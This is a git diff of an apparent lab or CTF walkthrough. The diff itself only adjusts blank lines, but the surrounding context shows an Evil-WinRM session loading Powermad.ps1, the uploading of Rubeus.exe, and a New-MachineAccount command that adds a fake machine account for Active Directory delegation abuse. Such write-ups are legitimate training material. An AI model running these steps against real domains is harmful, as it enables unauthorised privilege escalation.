@@ -302,6 +302,7 @@ Data: 180768 bytes of 180768 bytes copied
 Info: Upload successful!
 *Evil-WinRM* PS C:\temp> . .\Powermad.ps1
 ```
+
 We create a temp directory in C:\ so we have all RWX (right,write,execute) rights.
 We upload Rubeus.exe and Powermad.ps1
 For further information on Powermad.ps1 visit [https://offsec.tools/tool/powermad](https://offsec.tools/tool/powermad).
@@ -313,8 +314,8 @@ Now we just follow the instructions found with bloodhound to execute the exploit
 ```bash
 New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 [+] Machine account FAKE-COMP01 added
-
 ```
+
 * Step 2 (check if the machine has been created)
 
 ```bash
